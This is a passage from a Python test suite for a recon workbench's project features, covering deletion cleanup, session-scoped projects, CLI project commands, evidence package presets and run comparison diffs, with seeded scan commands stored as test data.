                "(id, project_id, name, enabled, target_entity_kind, match_mode, pattern, filters_json, "
                "apply_on_run, created_by_session_id, created, updated) "
                "VALUES (?, ?, 'Cleanup rule', 1, 'domain', 'domain_suffix', 'darklab.sh', '{}', 1, ?, "
                "datetime('now'), datetime('now'))",
                (rule_id, project["id"], session_id),
            )
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'project', ?, 'delete-me', datetime('now'))",
                ("lbl_project_delete_" + uuid.uuid4().hex, session_id, project["id"]),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'target', ?, 'delete target note', datetime('now'), datetime('now'))",
                ("note_target_delete_" + uuid.uuid4().hex, session_id, cleanup_target["id"]),
            )
            conn.commit()

        delete_resp = client.delete(f"/projects/{project['id']}", headers={"X-Session-ID": session_id})
        assert delete_resp.status_code == 200
        missing_resp = client.get(f"/projects/{project['id']}", headers={"X-Session-ID": session_id})
        assert missing_resp.status_code == 404
        with sqlite3.connect(DB_PATH) as conn:
            assert conn.execute(
                "SELECT COUNT(*) FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
                (project["id"],),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM project_auto_promote_rules WHERE project_id = ?",
                (project["id"],),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM entity_labels WHERE entity_type = 'project' AND entity_id = ?",
                (project["id"],),
            ).fetchone()[0] == 0
            assert conn.execute(
                "SELECT COUNT(*) FROM entity_notes WHERE entity_type = 'atlas_entity' AND entity_id = ?",
                (cleanup_target["id"],),
            ).fetchone()[0] == 0

    def test_delete_project_keeps_entity_owned_finding_target_when_entity_is_linked_elsewhere(self):
        client = get_client()
        session_id = self._session_id("project-delete-primary-target")
        deleted_project = self._create_project(client, session_id, name="Deleted target project")
        remaining_project = self._create_project(client, session_id, name="Remaining target project")
        deleted_target = json.loads(client.post(
            f"/projects/{deleted_project['id']}/targets",
            json={"type": "domain", "value": "darklab.sh"},
            headers={"X-Session-ID": session_id},
        ).data)["target"]
        remaining_target = json.loads(client.post(
            f"/projects/{remaining_project['id']}/targets",
            json={"type": "host", "value": "api.darklab.sh"},
            headers={"X-Session-ID": session_id},
        ).data)["target"]
        run_id = "run_project_delete_target_" + uuid.uuid4().hex
        finding_id = "fnd_" + uuid.uuid4().hex
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'nmap darklab.sh', datetime('now'))",
                (run_id, session_id),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, target_id, scope, raw_line, created) "
                "VALUES (?, ?, ?, ?, 'finding', 'target finding', datetime('now'))",
                (finding_id, session_id, run_id, deleted_target["id"]),
            )
            conn.commit()

        delete_resp = client.delete(
            f"/projects/{deleted_project['id']}",
            headers={"X-Session-ID": session_id},
        )
        assert delete_resp.status_code == 200
        with sqlite3.connect(DB_PATH) as conn:
            assert conn.execute(
                "SELECT target_id FROM findings WHERE session_id = ? AND id = ?",
                (session_id, finding_id),
            ).fetchone()[0] == deleted_target["id"]
            assert conn.execute(
                "SELECT COUNT(*) FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
                (deleted_project["id"],),
            ).fetchone()[0] == 0
            assert remaining_target["id"]

    def test_projects_are_session_scoped_and_slugs_are_unique_per_session(self):
        client = get_client()
        session_a = self._session_id("project-a")
        session_b = self._session_id("project-b")
        first = self._create_project(client, session_a, "Case")
        second = self._create_project(client, session_a, "Case")
        other_session = self._create_project(client, session_b, "Case")

        assert first["slug"] == "case"
        assert second["slug"] == "case-2"
        assert other_session["slug"] == "case"
        page = json.loads(client.get(
            "/projects?include_archived=1&limit=1&offset=1",
            headers={"X-Session-ID": session_a},
        ).data)
        assert page["total"] == 2
        assert page["offset"] == 1
        assert len(page["projects"]) == 1

        hidden = client.get(f"/projects/{first['id']}", headers={"X-Session-ID": session_b})
        assert hidden.status_code == 404

    def test_sets_gets_and_clears_active_project(self):
        client = get_client()
        session_id = self._session_id("project-active")
        project = self._create_project(client, session_id, "Active Case")

        empty = json.loads(client.get("/projects/active", headers={"X-Session-ID": session_id}).data)
        assert empty["project"] is None

        set_resp = client.post(
            "/projects/active",
            json={"project_id": project["id"]},
            headers={"X-Session-ID": session_id},
        )
        assert set_resp.status_code == 200
        assert json.loads(set_resp.data)["project"]["id"] == project["id"]

        current = json.loads(client.get("/projects/active", headers={"X-Session-ID": session_id}).data)
        assert current["project"]["slug"] == "active-case"

        clear_resp = client.delete("/projects/active", headers={"X-Session-ID": session_id})
        assert clear_resp.status_code == 200
        assert json.loads(clear_resp.data)["cleared"] is True
        cleared = json.loads(client.get("/projects/active", headers={"X-Session-ID": session_id}).data)
        assert cleared["project"] is None

        cli_session = self._session_id("project-cli")
        create_lines, create_code = execute_builtin_command("project create CLI Case", cli_session)
        assert create_code == 0
        assert "created CLI Case" in _builtin_lines_text(create_lines)

        current_lines, _ = execute_builtin_command("project current", cli_session)
        current_text = _builtin_lines_text(current_lines)
        assert "Active project:" in current_text
        assert "CLI Case" in current_text

        list_lines, _ = execute_builtin_command("project list", cli_session)
        assert "cli-case" in _builtin_lines_text(list_lines)

        clear_lines, _ = execute_builtin_command("project clear", cli_session)
        assert _builtin_line_text(clear_lines[0]) == "project: active project cleared"

        use_lines, _ = execute_builtin_command("project use cli-case", cli_session)
        assert "active project is CLI Case" in _builtin_line_text(use_lines[0])

        rename_lines, _ = execute_builtin_command("project rename cli-case CLI Case Renamed", cli_session)
        assert "renamed CLI Case Renamed" in _builtin_line_text(rename_lines[0])
        renamed_current, _ = execute_builtin_command("project current", cli_session)
        assert "CLI Case Renamed" in _builtin_lines_text(renamed_current)

        tab_one_run = self._seed_run(
            cli_session,
            "sleep 10",
            run_id="run-tab-one-" + uuid.uuid4().hex,
            owner_tab_id="tab-1",
            started="'2026-05-15T00:00:00+00:00'",
        )
        tab_two_run = self._seed_run(
            cli_session,
            "dig darklab.sh",
            run_id="run-tab-two-" + uuid.uuid4().hex,
            owner_tab_id="tab-2",
            started="'2026-05-15T00:01:00+00:00'",
        )
        link_last_lines, _ = execute_builtin_command("project link run last", cli_session, tab_id="tab-1")
        assert f"linked run {tab_one_run}" in _builtin_line_text(link_last_lines[0])
        link_session_last_lines, _ = execute_builtin_command("project link last", cli_session)
        assert f"linked run {tab_two_run}" in _builtin_line_text(link_session_last_lines[0])

        target_lines, _ = execute_builtin_command("project target add domain darklab.sh", cli_session)
        assert _builtin_line_text(target_lines[0]) == "project: target added domain darklab.sh"
        quick_target_lines, _ = execute_builtin_command("project target quick-add https://ip.darklab.sh/admin", cli_session)
        assert _builtin_line_text(quick_target_lines[0]) == "project: target added url https://ip.darklab.sh/admin"
        target_list_lines, _ = execute_builtin_command("project target list", cli_session)
        target_list_text = _builtin_lines_text(target_list_lines)
        assert "darklab.sh" in target_list_text
        assert "https://ip.darklab.sh/admin" in target_list_text
        remove_target_lines, _ = execute_builtin_command("project target remove darklab.sh", cli_session)
        assert _builtin_line_text(remove_target_lines[0]) == "project: target removed darklab.sh"

        archive_lines, _ = execute_builtin_command("project archive cli-case-renamed", cli_session)
        assert "archived CLI Case Renamed" in _builtin_line_text(archive_lines[0])

        archived_current, _ = execute_builtin_command("project current", cli_session)
        assert _builtin_line_text(archived_current[0]).startswith("No active project.")

        unarchive_lines, _ = execute_builtin_command("project unarchive cli-case-renamed", cli_session)
        assert "unarchived CLI Case Renamed" in _builtin_line_text(unarchive_lines[0])

        unarchived_current, _ = execute_builtin_command("project current", cli_session)
        assert _builtin_line_text(unarchived_current[0]).startswith("No active project.")

        delete_lines, _ = execute_builtin_command("project delete cli-case-renamed", cli_session)
        assert "deleted CLI Case Renamed" in _builtin_line_text(delete_lines[0])
        deleted_list_lines, _ = execute_builtin_command("project list --all", cli_session)
        assert "cli-case-renamed" not in _builtin_lines_text(deleted_list_lines)

    def test_projects_switcher_uses_active_mru_search_and_stale_pruning(self):
        client = get_client()
        session_id = self._session_id("project-switcher")
        alpha = self._create_project(client, session_id, "Alpha Case")
        beta = self._create_project(client, session_id, "Beta Case")
        gamma = self._create_project(client, session_id, "Gamma Needle")
        zzz = self._create_project(client, session_id, "Zzz Needle")

        for project in (beta, alpha):
            resp = client.post(
                "/projects/active",
                json={"project_id": project["id"]},
                headers={"X-Session-ID": session_id},
            )
            assert resp.status_code == 200

        empty_page = json.loads(client.get(
            "/projects?mode=switcher&limit=3",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [project["id"] for project in empty_page["projects"][:2]] == [alpha["id"], beta["id"]]
        assert empty_page["active_project_id"] == alpha["id"]
        assert empty_page["limit"] == 3

        search_page = json.loads(client.get(
            "/projects?mode=switcher&q=needle&limit=2",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [project["id"] for project in search_page["projects"]] == [gamma["id"], zzz["id"]]
        assert search_page["active_project_id"] == alpha["id"]
        assert search_page["query"] == "needle"

        archived = client.put(
            f"/projects/{beta['id']}",
            json={"status": "archived"},
            headers={"X-Session-ID": session_id},
        )
        assert archived.status_code == 200
        pruned_page = json.loads(client.get(
            "/projects?mode=switcher&limit=4",
            headers={"X-Session-ID": session_id},
        ).data)
        assert beta["id"] not in {project["id"] for project in pruned_page["projects"]}

    def test_package_presets_route_returns_shipped_catalog(self):
        client = get_client()
        session_id = self._session_id("package-presets")

        resp = client.get("/projects/package-presets", headers={"X-Session-ID": session_id})

        assert resp.status_code == 200
        body = json.loads(resp.data)
        assert [preset["id"] for preset in body["presets"]] == ["evidence", "summary", "full", "redacted"]
        assert body["presets"][0]["selection"]["findings"] == "non_false_positive"

    def test_package_presets_route_returns_custom_catalog(self):
        client = get_client()
        session_id = self._session_id("package-presets-custom")
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "package_presets.yaml"
            path.write_text(textwrap.dedent("""
            presets:
              - id: brief
                label: Brief
                selection:
                  runs: all
                  transcripts: none
                  findings: none
                  artifacts: none
                  targets: all
            """))
            with mock.patch.dict(project_routes.CFG, {"package_presets_file": str(path)}, clear=False):
                resp = client.get("/projects/package-presets", headers={"X-Session-ID": session_id})

        assert resp.status_code == 200
        assert json.loads(resp.data)["presets"][0]["id"] == "brief"

    def test_package_creation_accepts_known_configured_preset(self):
        client = get_client()
        session_id = self._session_id("package-known-preset")
        project = self._create_project(client, session_id)
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "package_presets.yaml"
            path.write_text(textwrap.dedent("""
            presets:
              - id: customer_handoff
                label: Customer Handoff
                selection:
                  runs: all
                  transcripts: none
                  findings: none
                  artifacts: none
                  targets: all
            """))
            with mock.patch.dict(project_routes.CFG, {"package_presets_file": str(path)}, clear=False):
                resp = client.post(
                    f"/projects/{project['id']}/packages",
                    json={"name": "Customer package", "preset": "customer_handoff"},
                    headers={"X-Session-ID": session_id},
                )

        assert resp.status_code == 201
        package = json.loads(resp.data)["package"]
        assert package["manifest"]["preset"] == "customer_handoff"
        legacy_manifest = {
            "format": 1,
            "package_format_version": 1,
            "project": {
                "id": project["id"],
                "name": project["name"],
                "slug": project.get("slug", ""),
            },
            "counts": {"runs": 0, "findings": 0, "artifacts": 0, "targets": 0},
            "selected_entity_ids": {
                "run_ids": [],
                "transcript_run_ids": [],
                "finding_ids": [],
                "artifact_ids": [],
                "target_ids": [],
            },
            "preset": "custom",
            "options": {"manifest_json": True},
            "redaction_mode": "raw",
            "include_private_notes": False,
            "include_artifacts": False,
        }
        legacy_package_id = f"pkg_legacy_{uuid.uuid4().hex[:12]}"
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO evidence_packages "
                "(id, session_id, project_id, name, description, redaction_mode, "
                "include_artifacts, manifest, status, created, updated) "
                "VALUES (?, ?, ?, ?, '', 'raw', 0, ?, 'draft', ?, ?)",
                (
                    legacy_package_id,
                    session_id,
                    project["id"],
                    "Legacy manifest",
                    json.dumps(legacy_manifest),
                    "2026-06-05T00:00:00Z",
                    "2026-06-05T00:00:00Z",
                ),
            )
            conn.commit()
        legacy_resp = client.get(
            f"/projects/{project['id']}/packages/{legacy_package_id}",
            headers={"X-Session-ID": session_id},
        )
        assert legacy_resp.status_code == 200
        legacy_package = json.loads(legacy_resp.data)["package"]
        assert legacy_package["manifest"]["package_format_version"] == 1
        assert legacy_package["manifest"]["provenance"]["schema_version"] == 1
        assert legacy_package["manifest"]["provenance"]["sources"]["project_links"]["origin_sources"] == []
        assert "not recorded" in legacy_package["manifest"]["provenance"]["sources"]["project_links"]["note"]
        assert legacy_package["manifest"]["provenance"]["privacy"]["redaction_mode"] == "raw"
        assert legacy_package["manifest"]["import_hints"]["schema_version"] == 1
        assert legacy_package["manifest"]["import_hints"]["summary"]["source_links"] == "not_recorded"
        assert legacy_package["manifest"]["import_hints"]["warnings"][0]["code"] == "legacy_manifest"

        legacy_unknown_manifest = dict(legacy_manifest)
        legacy_unknown_manifest.pop("redaction_mode", None)
        legacy_unknown_package_id = f"pkg_legacy_unknown_{uuid.uuid4().hex[:12]}"
        with db_connect() as conn:
            conn.execute(
                "INSERT INTO evidence_packages "
                "(id, session_id, project_id, name, description, redaction_mode, "
                "include_artifacts, manifest, status, created, updated) "
                "VALUES (?, ?, ?, ?, '', 'raw', 0, ?, 'draft', ?, ?)",
                (
                    legacy_unknown_package_id,
                    session_id,
                    project["id"],
                    "Legacy manifest without redaction",
                    json.dumps(legacy_unknown_manifest),
                    "2026-06-05T00:00:01Z",
                    "2026-06-05T00:00:01Z",
                ),
            )
            conn.commit()
        unknown_resp = client.get(
            f"/projects/{project['id']}/packages/{legacy_unknown_package_id}",
            headers={"X-Session-ID": session_id},
        )
        assert unknown_resp.status_code == 200
        unknown_package = json.loads(unknown_resp.data)["package"]
        assert unknown_package["manifest"]["provenance"]["build"]["redaction_mode"] == "unknown"
        assert unknown_package["manifest"]["provenance"]["privacy"]["redaction_mode"] == "unknown"

    def test_package_creation_rejects_unknown_preset(self):
        client = get_client()
        session_id = self._session_id("package-bad-preset")
        project = self._create_project(client, session_id)

        resp = client.post(
            f"/projects/{project['id']}/packages",
            json={"name": "Unknown preset", "preset": "unknown_customer"},
            headers={"X-Session-ID": session_id},
        )

        assert resp.status_code == 400
        assert json.loads(resp.data)["error"] == "package preset is not configured"

    def test_active_project_rejects_cross_session_and_clears_stale_projects(self):
        client = get_client()
        session_id = self._session_id("project-active")
        other_session = self._session_id("project-other")
        project = self._create_project(client, session_id, "Current Case")
        other_project = self._create_project(client, other_session, "Other Case")

        cross_session = client.post(
            "/projects/active",
            json={"project_id": other_project["id"]},
            headers={"X-Session-ID": session_id},
        )
        assert cross_session.status_code == 404

        set_resp = client.post(
            "/projects/active",
            json={"project_id": project["id"]},
            headers={"X-Session-ID": session_id},
        )
        assert set_resp.status_code == 200
        client.put(
            f"/projects/{project['id']}",
            json={"status": "archived"},
            headers={"X-Session-ID": session_id},
        )
        archived = json.loads(client.get("/projects/active", headers={"X-Session-ID": session_id}).data)
        assert archived["project"] is None

        revived = self._create_project(client, session_id, "Delete Me")
        client.post(
            "/projects/active",
            json={"project_id": revived["id"]},
            headers={"X-Session-ID": session_id},
        )
        delete_resp = client.delete(f"/projects/{revived['id']}", headers={"X-Session-ID": session_id})
        assert delete_resp.status_code == 200
        deleted = json.loads(client.get("/projects/active", headers={"X-Session-ID": session_id}).data)
        assert deleted["project"] is None

    def test_entity_note_routes_enforce_session_and_payload_boundaries(self):
        client = get_client()
        session_id = self._session_id("note-owner")
        other_session = self._session_id("note-other")
        run_id = self._seed_run(session_id)
        snapshot_id = self._seed_snapshot(session_id)

        create_resp = client.put(
            f"/entities/run/{run_id}/note",
            json={"body": "Owner-only note"},
            headers={"X-Session-ID": session_id},
        )
        assert create_resp.status_code == 200

        for method in ("get", "put", "delete"):
            request = getattr(client, method)
            kwargs = {"headers": {"X-Session-ID": other_session}}
            if method == "put":
                kwargs["json"] = {"body": "Cross-session overwrite"}
            resp = request(f"/entities/run/{run_id}/note", **kwargs)
            assert resp.status_code == 404

        missing_body = client.put(
            f"/entities/run/{run_id}/note",
            json={},
            headers={"X-Session-ID": session_id},
        )
        assert missing_body.status_code == 400
        whitespace_body = client.put(
            f"/entities/run/{run_id}/note",
            json={"body": "   "},
            headers={"X-Session-ID": session_id},
        )
        assert whitespace_body.status_code == 400
        non_object = client.put(
            f"/entities/run/{run_id}/note",
            json=["not", "an", "object"],
            headers={"X-Session-ID": session_id},
        )
        assert non_object.status_code == 400
        client.environ_base["HTTP_X_FORWARDED_FOR"] = f"203.0.113.{uuid.uuid4().int % 250 + 1}"
        unsupported_type = client.put(
            f"/entities/not_supported/{run_id}/note",
            json={"body": "Nope"},
            headers={"X-Session-ID": session_id},
        )
        assert unsupported_type.status_code == 400
        client.environ_base["HTTP_X_FORWARDED_FOR"] = f"203.0.113.{uuid.uuid4().int % 250 + 1}"
        missing_entity = client.put(
            "/entities/run/missing-run/note",
            json={"body": "Missing"},
            headers={"X-Session-ID": session_id},
        )
        assert missing_entity.status_code == 404

        owner_note = json.loads(client.get(
            f"/entities/run/{run_id}/note",
            headers={"X-Session-ID": session_id},
        ).data)["note"]
        assert owner_note["body"] == "Owner-only note"

        snapshot_label_resp = client.post(
            f"/entities/snapshot/{snapshot_id}/labels",
            json={"label": "handoff"},
            headers={"X-Session-ID": session_id},
        )
        assert snapshot_label_resp.status_code == 201
        snapshot_note_resp = client.put(
            f"/entities/snapshot/{snapshot_id}/note",
            json={"body": "Snapshot context"},
            headers={"X-Session-ID": session_id},
        )
        assert snapshot_note_resp.status_code == 200
        snapshot_labels = json.loads(client.get(
            f"/entities/snapshot/{snapshot_id}/labels",
            headers={"X-Session-ID": session_id},
        ).data)["labels"]
        assert [item["label"] for item in snapshot_labels] == ["handoff"]
        snapshot_note = json.loads(client.get(
            f"/entities/snapshot/{snapshot_id}/note",
            headers={"X-Session-ID": session_id},
        ).data)["note"]
        assert snapshot_note["body"] == "Snapshot context"

        cross_session_label = client.get(
            f"/entities/snapshot/{snapshot_id}/labels",
            headers={"X-Session-ID": other_session},
        )
        cross_session_note = client.get(
            f"/entities/snapshot/{snapshot_id}/note",
            headers={"X-Session-ID": other_session},
        )
        assert cross_session_label.status_code == 404
        assert cross_session_note.status_code == 404

        delete_label_resp = client.delete(
            f"/entities/snapshot/{snapshot_id}/labels",
            json={"label": "handoff"},
            headers={"X-Session-ID": session_id},
        )
        delete_note_resp = client.delete(
            f"/entities/snapshot/{snapshot_id}/note",
            headers={"X-Session-ID": session_id},
        )
        assert delete_label_resp.status_code == 200
        assert delete_note_resp.status_code == 200

    def test_project_compare_rejects_unlinked_cross_session_and_invalid_pairs(self):
        client = get_client()
        session_id = self._session_id("compare")
        other_session = self._session_id("compare-other")
        project = self._create_project(client, session_id)
        left_run_id = self._seed_run(session_id, "nmap darklab.sh")
        right_run_id = self._seed_run(session_id, "httpx darklab.sh")
        unlinked_run_id = self._seed_run(session_id, "nuclei darklab.sh")
        other_run_id = self._seed_run(other_session, "nmap other.example")
        self._link_run(client, session_id, project["id"], left_run_id)

        one_linked = client.get(
            self._project_compare_url(project["id"]),
            headers={"X-Session-ID": session_id},
        )
        assert one_linked.status_code == 400
        removed_project_route = client.get(
            f"/projects/{project['id']}/compare?left_run_id={left_run_id}&right_run_id={right_run_id}",
            headers={"X-Session-ID": session_id},
        )
        assert removed_project_route.status_code == 404

        self._link_run(client, session_id, project["id"], right_run_id)
        same_run = client.get(
            self._project_compare_url(project["id"], left=left_run_id, right=left_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert same_run.status_code == 400
        unlinked = client.get(
            self._project_compare_url(project["id"], left=left_run_id, right=unlinked_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert unlinked.status_code == 400
        cross_session = client.get(
            self._project_compare_url(project["id"], left=left_run_id, right=other_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert cross_session.status_code == 400
        missing_baseline = client.get(
            self._project_compare_url(project["id"], left=left_run_id, baseline_label="missing"),
            headers={"X-Session-ID": session_id},
        )
        assert missing_baseline.status_code == 400
        missing_project = client.get(
            self._project_compare_url("missing-project", left=left_run_id, right=right_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert missing_project.status_code == 404

    def test_project_compare_returns_empty_diffs_for_matching_empty_runs(self):
        client = get_client()
        session_id = self._session_id("compare-empty")
        project = self._create_project(client, session_id)
        left_run_id = self._seed_run(session_id, "nmap darklab.sh")
        right_run_id = self._seed_run(session_id, "nmap darklab.sh")
        self._link_run(client, session_id, project["id"], left_run_id)
        self._link_run(client, session_id, project["id"], right_run_id)

        resp = client.get(
            self._project_compare_url(project["id"], left=left_run_id, right=right_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert resp.status_code == 200
        payload = json.loads(resp.data)
        assert "findings" not in payload
        assert "artifacts" not in payload
        assert payload["objects"]["findings"] == {"added": [], "removed": [], "unchanged_count": 0}
        assert payload["objects"]["artifacts"] == {"added": [], "removed": [], "unchanged_count": 0}
        assert len(payload["density_buckets"]) == 256
        assert payload["density_buckets"][0] == {
            "start": 0, "end": 0, "equal": 0, "added": 0, "removed": 0, "changed": 0,
        }
        assert payload["limits"]["minimap_buckets"] == 256
        assert payload["truncated"] == {
            "left": False,
            "right": False,
            "changed_lines": False,
            "hunks_omitted": 0,
            "lines_omitted": {"left": 0, "right": 0, "total": 0},
        }

        with sqlite3.connect(DB_PATH) as conn:
            for line_number, raw_line in enumerate([
                "one.darklab.sh",
                "two.darklab.sh",
                "old.darklab.sh",
            ]):
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                    "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, datetime('now'))",
                    (
                        f"fnd_compare_left_{line_number}_{uuid.uuid4().hex[:8]}",
                        session_id,
                        left_run_id,
                        raw_line,
                        raw_line,
                        line_number,
                        f"fp-left-{line_number}-{left_run_id}",
                    ),
                )
            for line_number, raw_line in enumerate([
                "two.darklab.sh",
                "one.darklab.sh",
                "new.darklab.sh",
            ]):
                conn.execute(
                    "INSERT INTO findings "
                    "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                    "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, datetime('now'))",
                    (
                        f"fnd_compare_right_{line_number}_{uuid.uuid4().hex[:8]}",
                        session_id,
                        right_run_id,
                        raw_line,
                        raw_line,
                        line_number,
                        f"fp-right-{line_number}-{right_run_id}",
                    ),
                )
            for prefix, run_id in (("left", left_run_id), ("right", right_run_id)):
                conn.execute(
                    "INSERT INTO run_file_artifacts "
                    "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                    "VALUES (?, ?, ?, ?, ?, 'output', 8, 'workspace_flag', datetime('now'))",
                    (
                        f"rfa_compare_cap_{prefix}_{uuid.uuid4().hex[:8]}",
                        session_id,
                        run_id,
                        f"reports/{prefix}.txt",
                        f"{prefix}.txt",
                    ),
                )
            conn.commit()

        diff_resp = client.get(
            self._project_compare_url(project["id"], left=left_run_id, right=right_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert diff_resp.status_code == 200
        diff_payload = json.loads(diff_resp.data)
        assert [item["raw_line"] for item in diff_payload["objects"]["findings"]["added"]] == ["new.darklab.sh"]
        assert [item["raw_line"] for item in diff_payload["objects"]["findings"]["removed"]] == ["old.darklab.sh"]
        assert "compare_line_index" not in diff_payload["objects"]["findings"]["added"][0]
        assert diff_payload["objects"]["findings"]["added"][0]["line_number"] == 2
        assert diff_payload["objects"]["findings"]["unchanged_count"] == 2

        with mock.patch("services.runs.comparison.MAX_COMPARE_ITEMS_PER_SIDE", 0):
            capped_resp = client.get(
                self._project_compare_url(project["id"], left=left_run_id, right=right_run_id),
                headers={"X-Session-ID": session_id},
            )
        assert capped_resp.status_code == 200
        capped = json.loads(capped_resp.data)
        assert capped["left"]["persisted_finding_count"] == 3
        assert capped["right"]["persisted_finding_count"] == 3
        assert capped["left"]["artifact_count"] == 1
        assert capped["right"]["artifact_count"] == 1
        assert "findings" not in capped
        assert "artifacts" not in capped
        assert capped["objects"]["findings"] == {"added": [], "removed": [], "unchanged_count": 0}
        assert capped["objects"]["artifacts"] == {"added": [], "removed": [], "unchanged_count": 0}
        assert capped["truncated"] == {
            "left": True,
            "right": True,
            "changed_lines": False,
            "hunks_omitted": 0,
            "lines_omitted": {"left": 0, "right": 0, "total": 0},
            "findings": {"left": True, "right": True},
            "artifacts": {"left": True, "right": True},
            "item_limit": 0,
        }

    def test_project_and_history_compare_match_artifacts_by_content_hash(self):
        client = get_client()
        session_id = self._session_id("compare-artifact-hash")
        project = self._create_project(client, session_id)
        left_run_id = self._seed_run(session_id, "nmap darklab.sh")
        right_run_id = self._seed_run(session_id, "nmap darklab.sh")
        self._link_run(client, session_id, project["id"], left_run_id)
        self._link_run(client, session_id, project["id"], right_run_id)
        artifact_hash = hashlib.sha256(b"same artifact bytes").hexdigest()
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, "
                "detected_by, content_sha256, created) "
                "VALUES (?, ?, ?, 'reports/left.txt', 'left.txt', 'output', 19, "
                "'workspace_flag', ?, datetime('now'))",
                (f"rfa_left_{uuid.uuid4().hex[:8]}", session_id, left_run_id, artifact_hash),
            )
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, "
                "detected_by, content_sha256, created) "
                "VALUES (?, ?, ?, 'reports/right.txt', 'right.txt', 'output', 19, "
                "'workspace_flag', ?, datetime('now'))",
                (f"rfa_right_{uuid.uuid4().hex[:8]}", session_id, right_run_id, artifact_hash),
            )
            conn.commit()

        history_resp = client.get(
            f"/history/compare?left={left_run_id}&right={right_run_id}",
            headers={"X-Session-ID": session_id},
        )
        project_resp = client.get(
            self._project_compare_url(project["id"], left=left_run_id, right=right_run_id),
            headers={"X-Session-ID": session_id},
        )
        assert history_resp.status_code == 200
        assert project_resp.status_code == 200
        history_artifacts = json.loads(history_resp.data)["objects"]["artifacts"]
        project_artifacts = json.loads(project_resp.data)["objects"]["artifacts"]
        assert history_artifacts == {"added": [], "removed": [], "unchanged_count": 1}
        assert project_artifacts == history_artifacts

    def test_project_scoped_compare_lines_requires_linked_project_runs(self):
        client = get_client()
        session_id = self._session_id("compare-lines")
        other_session = self._session_id("compare-lines-other")
        project = self._create_project(client, session_id)
        left_run_id = self._seed_run(session_id, "nmap darklab.sh")
        right_run_id = self._seed_run(session_id, "nmap darklab.sh")
        unlinked_run_id = self._seed_run(session_id, "nmap unlinked.example")
        self._link_run(client, session_id, project["id"], left_run_id)
        self._link_run(client, session_id, project["id"], right_run_id)

        linked = client.get(
            f"/history/compare/lines?left={left_run_id}&right={right_run_id}"
            f"&project_id={project['id']}&side=a&start=0&end=0",
            headers={"X-Session-ID": session_id},
        )
        assert linked.status_code == 200
        assert json.loads(linked.data)["lines"] == []

        unlinked = client.get(
            f"/history/compare/lines?left={left_run_id}&right={unlinked_run_id}"
            f"&project_id={project['id']}&side=a&start=0&end=0",
            headers={"X-Session-ID": session_id},
        )
        assert unlinked.status_code == 400

        cross_session = client.get(
            f"/history/compare/lines?left={left_run_id}&right={right_run_id}"
            f"&project_id={project['id']}&side=a&start=0&end=0",
            headers={"X-Session-ID": other_session},
        )
        assert cross_session.status_code == 404

    @mock.patch.dict(shell_app.CFG, {"workspace_enabled": True}, clear=False)
    def test_links_run_and_unlinks_without_duplicate_rows(self):
        client = get_client()
        session_id = self._session_id("project-link")
        project = self._create_project(client, session_id)

        notes_resp = client.put(
            f"/projects/{project['id']}",
            json={"notes": "Package notes for the external handoff."},
            headers={"X-Session-ID": session_id},
        )
        assert notes_resp.status_code == 200
        run_id = "run-" + uuid.uuid4().hex
        baseline_run_id = "run-" + uuid.uuid4().hex
        outside_run_id = "run-" + uuid.uuid4().hex
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, ?, datetime('now'), ?, ?)",
                (
                    run_id,
                    session_id,
                    "nmap darklab.sh",
                    json.dumps([
                        {
                            "text": "443/tcp open https",
                            "cls": "",
                            "line_index": 0,
                            "signals": ["findings"],
                            "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
                        },
                        {
                            "text": "rate:  0.10-kpps, 49.90% done,   0:00:09 remaining, found=2",
                            "role": "progress",
                            "noise_kind": "progress",
                            "line_index": 1,
                        },
                        {"text": "scan completed", "cls": "", "line_index": 2},
                    ]),
                    3,
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, ?, datetime('now'), ?, ?)",
                (
                    baseline_run_id,
                    session_id,
                    "nmap darklab.sh",
                    json.dumps([{"text": "80/tcp open http", "cls": "", "line_index": 0}]),
                    1,
                ),
            )
            conn.execute(
                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
                "VALUES (?, ?, ?, datetime('now'), ?, ?)",
                (
                    outside_run_id,
                    session_id,
                    "httpx https://outside.darklab.sh",
                    json.dumps([{"text": "outside project", "cls": "", "line_index": 0}]),
                    1,
                ),
            )
            conn.commit()

        payload = {"entity_type": "run", "entity_id": run_id, "source": "manual"}
        link_resp = client.post(
            f"/projects/{project['id']}/links",
            json=payload,
            headers={"X-Session-ID": session_id},
        )
        duplicate_resp = client.post(
            f"/projects/{project['id']}/links",
